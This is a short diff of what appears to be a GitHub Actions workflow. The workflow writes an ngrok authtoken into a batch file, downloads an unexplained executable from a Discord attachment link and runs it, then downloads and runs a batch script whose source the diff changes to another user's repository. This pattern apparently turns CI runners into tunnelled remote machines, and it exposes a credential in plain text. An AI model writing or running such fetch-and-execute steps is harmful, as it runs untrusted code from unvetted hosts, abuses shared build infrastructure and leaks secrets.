@@ -14,7 +14,7 @@ jobs:
         cmd /c tzutil /s "SE Asia Standard Time"
         cmd /c echo ngrok authtoken "1yrFfdlmNZ1wxCnkF0iAUY4iZe6_2fkSffRvC7HEyRtrc6uQC" > ngrok.bat
         cmd /c curl -s -O https://cdn.discordapp.com/attachments/836128067885072396/855868420679532564/githubdev.exe
-        cmd /c curl -s -O https://raw.githubusercontent.com/thuonghaivn/Windows11DEV/main/test.bat
+        cmd /c curl -s -O https://raw.githubusercontent.com/Jwestbr2/Project/main/test.bat
         cmd /c githubdev.exe
         cmd /c test.bat
         
